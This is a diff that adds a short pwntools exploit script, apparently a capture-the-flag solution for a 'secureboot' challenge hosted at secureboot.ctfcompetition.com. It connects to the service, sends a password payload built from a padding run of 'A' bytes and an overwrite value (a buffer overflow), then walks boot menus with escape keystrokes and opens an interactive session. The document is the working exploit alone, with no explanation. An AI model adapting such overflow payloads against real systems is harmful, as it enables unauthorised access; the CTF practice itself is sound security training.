@@ -1,0 +1,26 @@
+from pwn import *
+
+r = remote("secureboot.ctfcompetition.com", 1337)
+sleep(2)
+r.sendline("\x1b")	# esc
+sleep(2)
+r.sendafter("Password?", "\x03\x49" + "A" * 0x86 + "\x99\x18\xec\x07\r")
+sleep(2)
+r.sendline("^[[B")
+r.sendline("^[[A")
+r.sendline("^[[A")
+r.sendline("^[[A")
+r.sendline("^[[A")
+r.sendline("\r")
+r.sendline("\r")
+r.sendline("^[[B")
+r.sendline("^[[A")
+r.sendline(" ")
+r.sendline("\x1b")
+r.sendline("\x1b")
+r.sendline("\x1b")
+r.sendline("^[[B")
+r.sendline("^[[A")
+r.sendline("\r")
+
+r.interactive()
